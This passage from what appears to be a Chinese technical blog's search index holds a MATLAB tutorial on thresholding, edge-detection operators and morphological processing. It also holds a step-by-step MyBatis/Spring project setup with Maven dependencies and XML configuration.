href=\"https://blog.csdn.net/jacke121/article/details/95213552\">https://blog.csdn.net/jacke121/article/details/95213552</a></li>\n<li>   <a href=\"http://www.manongjc.com/article/71482.html\">http://www.manongjc.com/article/71482.html</a>  </li>\n</ol>\n","categories":["图像处理"],"tags":["hexo"]},{"title":"分割与形态学处理","url":"/p/65011/","content":"<span id=\"more\"></span>\n\n<h2 id=\"阈值分割\"><a href=\"#阈值分割\" class=\"headerlink\" title=\"阈值分割\"></a>阈值分割</h2><h4 id=\"双峰阈值\"><a href=\"#双峰阈值\" class=\"headerlink\" title=\"双峰阈值\"></a>双峰阈值</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">close all;</span><br><span class=\"line\">clear;</span><br><span class=\"line\">clc;</span><br><span class=\"line\">rgbraw = imread(&#x27;正常lenna.png&#x27;);</span><br><span class=\"line\">raw = rgb2gray(rgbraw);</span><br><span class=\"line\">% 双峰谷底肉眼寻找阈值法</span><br><span class=\"line\">kernel = [0,1,0;1,1,1;0,1,0];</span><br><span class=\"line\">res = conv2(kernel,raw);</span><br><span class=\"line\">[m,n] = size(raw);</span><br><span class=\"line\">new = zeros(m,n);</span><br><span class=\"line\">for i=1:m</span><br><span class=\"line\">    for j=1:n</span><br><span class=\"line\">        if(raw(i,j)&gt;85)</span><br><span class=\"line\">            new(i,j)=1;</span><br><span class=\"line\">        else</span><br><span class=\"line\">            new(i,j)=0;</span><br><span class=\"line\">        end</span><br><span class=\"line\">    end</span><br><span class=\"line\">end</span><br><span class=\"line\">imhist(raw);</span><br><span class=\"line\">figure,</span><br><span class=\"line\">subplot(311),imshow(new),title(&#x27;自己写的阈值&#x27;);</span><br><span class=\"line\">subplot(312),imshow(imbinarize(raw,0.4)),title(&#x27;matlab自带函数&#x27;);</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"迭代法阈值\"><a href=\"#迭代法阈值\" class=\"headerlink\" title=\"迭代法阈值\"></a>迭代法阈值</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">% 自定义阈值</span><br><span class=\"line\">raw2 = raw;</span><br><span class=\"line\">T = mean2(raw2);</span><br><span class=\"line\">d = false;</span><br><span class=\"line\">while ~d</span><br><span class=\"line\">    cond = raw2&gt;T;</span><br><span class=\"line\">    Tnew = (mean(raw2(cond))+mean(raw2(~cond)))/2;</span><br><span class=\"line\">    d = abs(Tnew-T)&lt;0.5;</span><br><span class=\"line\">    T = Tnew;   </span><br><span class=\"line\">end</span><br><span class=\"line\">raw2(cond)=1;</span><br><span class=\"line\">raw2(~cond)=0;</span><br><span class=\"line\">subplot(313),imshow(double(raw2)),title(&#x27;迭代法阈值&#x27;);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"OSTU阈值\"><a href=\"#OSTU阈值\" class=\"headerlink\" title=\"OSTU阈值\"></a>OSTU阈值</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"> raw3 = im2double(raw);   </span><br><span class=\"line\"> [m,n] = size(raw3);</span><br><span class=\"line\"> pixelnum = m*n;</span><br><span class=\"line\"> maxVar = 0;</span><br><span class=\"line\"> pixelSum = 0;</span><br><span class=\"line\"> for i=1:m</span><br><span class=\"line\">     for j=1:n</span><br><span class=\"line\">        pixelSum = pixelSum+raw3(i,j);</span><br><span class=\"line\">     end</span><br><span class=\"line\"> end</span><br><span class=\"line\">aver = pixelSum/pixelnum;</span><br><span class=\"line\">for t=0:255</span><br><span class=\"line\">    suma = 0;</span><br><span class=\"line\">    sumb = 0;</span><br><span class=\"line\">    numa = 0;</span><br><span class=\"line\">    numb = 0;</span><br><span class=\"line\">    for i=1:m</span><br><span class=\"line\">        for j=1:n</span><br><span class=\"line\">            if(raw3(i,j)*255&gt;=t)</span><br><span class=\"line\">                numa = numa+1;</span><br><span class=\"line\">                suma = suma+raw3(i,j);</span><br><span class=\"line\">            else</span><br><span class=\"line\">                numb = numb+1;</span><br><span class=\"line\">                sumb= sumb+raw3(i,j);</span><br><span class=\"line\">            end</span><br><span class=\"line\">        end       </span><br><span class=\"line\">    end</span><br><span class=\"line\">    pa = numa/pixelnum;</span><br><span class=\"line\">    pb = numb/pixelnum;</span><br><span class=\"line\">    aave = suma*255/numa;</span><br><span class=\"line\">    bave = sumb*255/numb;</span><br><span class=\"line\">    ostu = pa*((aave-aver)^2)+pb*((bave-aver)^2);</span><br><span class=\"line\">    if(ostu&gt;maxVar)</span><br><span class=\"line\">        maxVar = ostu;</span><br><span class=\"line\">        res = t;</span><br><span class=\"line\">    end</span><br><span class=\"line\">end</span><br><span class=\"line\">ress = graythresh(raw3);</span><br><span class=\"line\">figure</span><br><span class=\"line\">subplot(211),imshow(imbinarize(raw3,res/255)),title(&#x27;自己写的otsu&#x27;);</span><br><span class=\"line\">subplot(212),imshow(imbinarize(raw3,ress)),title(&#x27;matlab自带的otsu&#x27;);</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"各种算子\"><a href=\"#各种算子\" class=\"headerlink\" title=\"各种算子\"></a>各种算子</h2><h4 id=\"Robert算子\"><a href=\"#Robert算子\" class=\"headerlink\" title=\"Robert算子\"></a>Robert算子</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">robert_x = [-1,0;0,1];</span><br><span class=\"line\">robert_y = [0,-1;1,0];</span><br><span class=\"line\">[m,n] = size(raw);</span><br><span class=\"line\">raw4 = raw;</span><br><span class=\"line\">% 初始阈值</span><br><span class=\"line\">threshold = 15;</span><br><span class=\"line\">for i=1:m-1</span><br><span class=\"line\">    for j=1:n-1</span><br><span class=\"line\">        x = abs(raw(i+1,j+1)-raw(i,j));</span><br><span class=\"line\">        y = abs(raw(i+1,j)-raw(i,j+1));</span><br><span class=\"line\">        if(x+y&gt;threshold)</span><br><span class=\"line\">            raw4(i,j) = 255;</span><br><span class=\"line\">        else</span><br><span class=\"line\">            raw4(i,j) = 0;</span><br><span class=\"line\">        end</span><br><span class=\"line\">    end</span><br><span class=\"line\">end</span><br><span class=\"line\">figure,imshow(raw4),title(&#x27;Roberts算子阈值为15&#x27;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"Sobel算子\"><a href=\"#Sobel算子\" class=\"headerlink\" title=\"Sobel算子\"></a>Sobel算子</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">sobel_x = [-1,0,1;-2,0,2;-1,0,1];</span><br><span class=\"line\">sobel_y = [-1,-2,-1;0,0,0;1,2,1];</span><br><span class=\"line\">[m,n] = size(raw);</span><br><span class=\"line\">threshold = 150;</span><br><span class=\"line\">raw5 = zeros(m,n);</span><br><span class=\"line\">resx = conv2(raw,sobel_x,&#x27;valid&#x27;);</span><br><span class=\"line\">resy = conv2(raw,sobel_y,&#x27;valid&#x27;);</span><br><span class=\"line\">for i=1:m-2</span><br><span class=\"line\">    for j=1:n-2</span><br><span class=\"line\">        temp = sqrt(resx(i,j)^2+resy(i,j)^2);</span><br><span class=\"line\">        if(temp&gt;threshold)</span><br><span class=\"line\">            raw5(i,j) = 255;</span><br><span class=\"line\">        else</span><br><span class=\"line\">            raw5(i,j) = 0;</span><br><span class=\"line\">        end</span><br><span class=\"line\">    end</span><br><span class=\"line\">end</span><br><span class=\"line\">figure,imshow(raw5),title(&#x27;sobel算子阈值为150&#x27;); </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"拉普拉斯算子\"><a href=\"#拉普拉斯算子\" class=\"headerlink\" title=\"拉普拉斯算子\"></a>拉普拉斯算子</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[m,n] = size(raw);</span><br><span class=\"line\">raw6 =raw;</span><br><span class=\"line\">raw = mat2gray(raw);</span><br><span class=\"line\">threshold = 0.15;</span><br><span class=\"line\">for j=2:m-1 </span><br><span class=\"line\">    for k=2:n-1</span><br><span class=\"line\">        L=abs(4*raw(j,k)-raw(j-1,k)-raw(j+1,k)-raw(j,k+1)-raw(j,k-1));</span><br><span class=\"line\">        if(L &gt; threshold)</span><br><span class=\"line\">            raw6(j,k)=255;</span><br><span class=\"line\">        else</span><br><span class=\"line\">            raw6(j,k)=0;    </span><br><span class=\"line\">        end</span><br><span class=\"line\">    end</span><br><span class=\"line\">end</span><br><span class=\"line\">figure,imshow(raw6),title(&#x27;拉普拉斯算子阈值为0.15&#x27;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"对比\"><a href=\"#对比\" class=\"headerlink\" title=\"对比\"></a>对比</h4><p><strong>Roberts算子</strong>：边缘定位准，但是对噪声敏感。适用于边缘明显且噪声较少的图像分割。Roberts边缘检测算子是一种利用局部差分算子寻找边缘的算子,Robert算子图像处理后结果边缘不是很平滑。经分析，由于Robert算子通常会在图像边缘附近的区域内产生较宽的响应，故采用上述算子检测的边缘图像常需做细化处理，边缘定位的精度不是很高。</p>\n<p><strong>Prewitt算子</strong>：对噪声有抑制作用，抑制噪声的原理是通过像素平均，但是像素平均相当于对图像的低通滤波，所以Prewitt算子对边缘的定位不如Roberts算子。</p>\n<p><strong>Sobel算子</strong>：Sobel算子和Prewitt算子都是加权平均，但是Sobel算子认为，邻域的像素对当前像素产生的影响不是等价的，所以距离不同的像素具有不同的权值，对算子结果产生的影响也不同。一般来说，距离越远，产生的影响越小。</p>\n<p>LOG滤波器方法通过检测二阶导数过零点来判断边缘点。LOG滤波器中的a正比于低通滤波器的宽度，a越大，平滑作用越显著，<strong>去除噪声越好</strong>，但图像的细节也损失越大，边缘精度也就越低。所以在边缘定位精度和消除噪声级间存在着矛盾，应该根据具体问题对噪声水平和边缘点定位精度要求适当选取。</p>\n<h2 id=\"形态学处理\"><a href=\"#形态学处理\" class=\"headerlink\" title=\"形态学处理\"></a>形态学处理</h2><h4 id=\"二值化及阈值分割\"><a href=\"#二值化及阈值分割\" class=\"headerlink\" title=\"二值化及阈值分割\"></a>二值化及阈值分割</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">lung = rgb2gray(imread(&#x27;lung.jpg&#x27;));</span><br><span class=\"line\">lung = imbinarize(lung);</span><br><span class=\"line\">newlung = lung;</span><br><span class=\"line\">[m,n] = size(lung);</span><br><span class=\"line\">for i=1:m</span><br><span class=\"line\">    for j=1:n</span><br><span class=\"line\">        if(lung(i,j)&gt;0.75)</span><br><span class=\"line\">            newlung(i,j) = 255;</span><br><span class=\"line\">        else</span><br><span class=\"line\">        if(lung(i,j)&gt;0.75)</span><br><span class=\"line\">            newlung(i,j) = 0;</span><br><span class=\"line\">        end</span><br><span class=\"line\">        end</span><br><span class=\"line\">    end</span><br><span class=\"line\">end</span><br><span class=\"line\">figure,</span><br><span class=\"line\">subplot(211),imshow(imread(&#x27;lung.jpg&#x27;)),title(&#x27;原图&#x27;);</span><br><span class=\"line\">subplot(212),imshow(newlung),title(&#x27;分割后&#x27;);</span><br><span class=\"line\">figure,imshow(lung);</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"腐蚀与膨胀，开闭操作\"><a href=\"#腐蚀与膨胀，开闭操作\" class=\"headerlink\" title=\"腐蚀与膨胀，开闭操作\"></a>腐蚀与膨胀，开闭操作</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">newlung = imcomplement(newlung);</span><br><span class=\"line\">se=strel(&#x27;square&#x27;,6);</span><br><span class=\"line\">se3=strel(&#x27;square&#x27;,6);</span><br><span class=\"line\">se2=strel(&#x27;rectangle&#x27;,[10,12]);</span><br><span class=\"line\">se4=strel(&#x27;square&#x27;,2);</span><br><span class=\"line\"></span><br><span class=\"line\">% resu = imopen(newlung,se2);</span><br><span class=\"line\">resu = imclose(newlung,se2);</span><br><span class=\"line\">resu2 = imclose(resu,se2);</span><br><span class=\"line\">resu2 = imerode(resu,se);</span><br><span class=\"line\">resu2 = imdilate(resu,se3);</span><br><span class=\"line\">resu2 = imerode(resu,se);</span><br><span class=\"line\"></span><br><span class=\"line\">figure,</span><br><span class=\"line\">subplot(211),imshow(resu),title(&#x27;系统自带&#x27;);</span><br><span class=\"line\">subplot(212),imshow(resu2),title(&#x27;自定义序列&#x27;)</span><br></pre></td></tr></table></figure>\n","categories":["图像处理"]},{"title":"mybatis搭建细节","url":"/p/65015/","content":"<h1 id=\"mybatis项目搭建\"><a href=\"#mybatis项目搭建\" class=\"headerlink\" title=\"mybatis项目搭建\"></a>mybatis项目搭建</h1><h2 id=\"1-新建maven项目\"><a href=\"#1-新建maven项目\" class=\"headerlink\" title=\"1.新建maven项目\"></a>1.新建maven项目</h2><p>​    以org.apache.maven.archetypes:maven-archetype-webapp为原型建立maven项目</p>\n<h2 id=\"2-导入依赖\"><a href=\"#2-导入依赖\" class=\"headerlink\" title=\"2.导入依赖\"></a>2.导入依赖</h2><p>​    导入相关依赖</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">dependencies</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"comment\">&lt;!--mysql依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>mysql<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>mysql-connector-java<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>5.1.47<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--mybatis依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.mybatis<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>mybatis<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>3.5.2<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--spring相关依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-webmvc<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>5.3.10<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--spring操作数据库的依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.springframework<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>spring-jdbc<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>5.3.10<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">&lt;!--aop的依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.aspectj<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>aspectjweaver<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.9.7<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"comment\">&lt;!--spring操作mybatis的依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.mybatis<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>mybatis-spring<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>2.0.6<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"comment\">&lt;!--单元测试依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>junit<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>junit<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>4.11<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"comment\">&lt;!--bean的构建工具依赖 --&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">groupId</span>&gt;</span>org.projectlombok<span class=\"tag\">&lt;/<span class=\"name\">groupId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">artifactId</span>&gt;</span>lombok<span class=\"tag\">&lt;/<span class=\"name\">artifactId</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">version</span>&gt;</span>1.18.22<span class=\"tag\">&lt;/<span class=\"name\">version</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">scope</span>&gt;</span>provided<span class=\"tag\">&lt;/<span class=\"name\">scope</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">dependency</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h2 id=\"3-构建pojo类相关包\"><a href=\"#3-构建pojo类相关包\" class=\"headerlink\" title=\"3.构建pojo类相关包\"></a>3.构建pojo类相关包</h2><h2 id=\"4-配置mybatis与spring的配置文件\"><a href=\"#4-配置mybatis与spring的配置文件\" class=\"headerlink\" title=\"4.配置mybatis与spring的配置文件\"></a>4.配置mybatis与spring的配置文件</h2><h3 id=\"4-1-数据库-db-properties\"><a href=\"#4-1-数据库-db-properties\" class=\"headerlink\" title=\"4.1 数据库(db.properties)\"></a>4.1 数据库(db.properties)</h3><figure class=\"highlight properties\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">driver</span>=<span class=\"string\">com.mysql.jdbc.Driver</span></span><br><span class=\"line\"><span class=\"attr\">url</span>=<span class=\"string\">jdbc:mysql://127.0.0.1:3306/mybatis?useUnicode=true&amp;characterEncoding=UTF-8&amp;useSSL=false&amp;serverTimezone=GMT%2B8&amp;failOverReadOnly=false</span></span><br><span class=\"line\"><span class=\"attr\">username</span>=<span class=\"string\">root</span></span><br><span class=\"line\"><span class=\"attr\">password</span>=<span class=\"string\">root</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-2-mybatis\"><a href=\"#4-2-mybatis\" class=\"headerlink\" title=\"4.2 mybatis\"></a>4.2 mybatis</h3><h4 id=\"4-2-1编写xml文件\"><a href=\"#4-2-1编写xml文件\" class=\"headerlink\" title=\"4.2.1编写xml文件\"></a>4.2.1编写xml文件</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">configuration</span></span></span><br><span class=\"line\"><span class=\"meta\">        <span class=\"meta-keyword\">PUBLIC</span> <span class=\"meta-string\">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">        <span class=\"meta-string\">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">configuration</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">properties</span> <span class=\"attr\">resource</span>=<span class=\"string\">&quot;db.properties&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">typeAliases</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">package</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;com.iushop.pojo&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">typeAliases</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">environments</span> <span class=\"attr\">default</span>=<span class=\"string\">&quot;development&quot;</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">environment</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;development&quot;</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">transactionManager</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">dataSource</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;POOLED&quot;</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;driver&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;$&#123;driver&#125;&quot;</span>/&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;url&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;$&#123;url&#125;&quot;</span>/&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;username&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;$&#123;username&#125;&quot;</span>/&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">property</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;password&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;$&#123;password&#125;&quot;</span>/&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">dataSource</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">environment</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">environments</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">mappers</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">mapper</span> <span class=\"attr\">resource</span>=<span class=\"string\">&quot;org/mybatis/example/BlogMapper.xml&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">mappers</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">configuration</span>&gt;</span> </span><br></pre></td></tr></table></figure>\n\n<h4 id=\"4-2-2-加入别名并导入db配置文件\"><a href=\"#4-2-2-加入别名并导入db配置文件\" class=\"headerlink\" title=\"4.2.2 加入别名并导入db配置文件\"></a>4.2.2 加入别名并导入db配置文件</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">properties</span> <span class=\"attr\">resource</span>=<span class=\"string\">&quot;db.properties&quot;</span>/&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">typeAliases</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">package</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;com.iushop.pojo&quot;</span>/&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">typeAliases</span>&gt;</span>  </span><br></pre></td></tr></table></figure>\n\n<h4 id=\"4-2-3-编写Mapper与Mapper-xml\"><a href=\"#4-2-3-编写Mapper与Mapper-xml\" class=\"headerlink\" title=\"4.2.3 编写Mapper与Mapper.xml\"></a>4.2.3 编写Mapper与Mapper.xml</h4><p>Mapper.xml如下,只需修改mybatis.xml中的xml配置文件中的两个config改为mapper并修改根节点为<mapper></mapper></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">mapper</span></span></span><br><span class=\"line\"><span class=\"meta\">        <span class=\"meta-keyword\">PUBLIC</span> <span class=\"meta-string\">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">        <span class=\"meta-string\">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">mapper</span> <span class=\"attr\">namespace</span>=<span class=\"string\">&quot;com.iushop.mapper.UserMapper&quot;</span>&gt;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">mapper</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"4-2-4-mybatis全局配置文件中绑定Mapper文件\"><a href=\"#4-2-4-mybatis全局配置文件中绑定Mapper文件\" class=\"headerlink\" title=\"4.2.4 mybatis全局配置文件中绑定Mapper文件\"></a>4.2.4 mybatis全局配置文件中绑定Mapper文件</h4><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">mappers</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">mapper</span> <span class=\"attr\">resource</span>=<span class=\"string\">&quot;org/mybatis/example/UserMapper.xml&quot;</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">mappers</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">&lt;!--或者要注意xml的包名要与接口的包名相同才可以--&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">mappers</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">mapper</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;com.iushop.mapper.UserMapper&quot;</span>/&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">mappers</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>否则报错(BindException)</p>\n<p><img src=\"https://testmybuck.oss-cn-beijing.aliyuncs.com/img/image-20211217153712823.png\" alt=\"image-20211217153712823\"></p>\n<h4 id=\"4-2-5-maven静态资源过滤\"><a href=\"#4-2-5-maven静态资源过滤\" class=\"headerlink\" title=\"4.2.5 maven静态资源过滤\"></a>4.2.5 